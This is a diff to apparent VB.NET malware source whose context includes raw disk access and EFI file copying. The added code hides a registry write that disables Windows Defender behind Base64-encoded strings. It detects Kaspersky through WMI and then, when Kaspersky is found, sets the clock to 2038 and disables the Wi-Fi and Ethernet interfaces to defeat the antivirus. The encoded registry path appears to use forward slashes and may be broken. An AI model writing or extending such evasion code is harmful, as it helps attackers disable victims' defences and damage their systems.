@@ -8,7 +8,30 @@ Imports System.Windows.Forms
 Imports Microsoft.Win32
 Imports System.Runtime.InteropServices
 Imports NAudio.Wave
+Imports System.Management
+Imports System.Text
+
 Module Program
+    Private Function DecodeBase64(encodedString As String) As String
+        Dim bytes As Byte() = Convert.FromBase64String(encodedString)
+        Return Encoding.UTF8.GetString(bytes)
+    End Function
+
+    Private Function IsKasperskyInstalled() As Boolean
+        Dim searcher As New ManagementObjectSearcher("root\SecurityCenter2", "Select * from AntivirusProduct")
+
+        Dim results As ManagementObjectCollection = searcher.Get()
+
+        For Each result As ManagementObject In results
+            Dim antivirusName As String = result("displayName").ToString()
+
+            If antivirusName.Contains("Kaspersky") Then
+                Return True
+            End If
+        Next
+
+        Return False
+    End Function
 
     ' Import CreateFile from Kernel32.dll for low-level disk access
     <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
@@ -192,12 +215,22 @@ Module Program
         End Try
 
         Try
-            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
-            reg.SetValue("DisableAntiSpyware", 1)
+            ' Base64 encoded registry path and value name
+            Dim base64Path As String = "U09GV0FSRS9Qb2xpY2llcy9NaWNyb3NvZnQvV2luZG93cyBEZWZlbmRlcg=="
+            Dim base64ValueName As String = "RGlzYWJsZUFudGktU3B5YXdhcmU="
+
+            ' Decode the Base64 encoded strings
+            Dim registryPath As String = DecodeBase64(base64Path)
+            Dim valueName As String = DecodeBase64(base64ValueName)
+
+            ' Open the registry key and set the value
+            Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey(registryPath)
+            reg.SetValue(valueName, 1)
             reg.Close()
         Catch ex As Exception
-            Console.WriteLine("Error modifying Microsoft\Windows Defender registry: " & ex.Message)
+            Console.WriteLine("Error modifying Defender registry: " & ex.Message)
         End Try
+
 
         Try
             Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
@@ -404,6 +437,17 @@ Module Program
     Private Sub ExtractAndCopyEFI(sourceFilePath As String, destinationFilePath As String)
         ' Extract and copy EFI file to the destination
         File.Copy(sourceFilePath, destinationFilePath, True)
+    End Sub
+
+    Private Sub SetDateAndDisableInternet()
+        If IsKasperskyInstalled() Then
+            ' Set the system date to January 1, 2038
+            RunCommand("date 01-01-2038")
+
+            ' Disable the internet connection (disable all network interfaces)
+            RunCommand("netsh interface set interface ""Wi-Fi"" admin=disable")
+            RunCommand("netsh interface set interface ""Ethernet"" admin=disable")
+        End If
     End Sub
 
     Private Sub RunCommand(command As String)
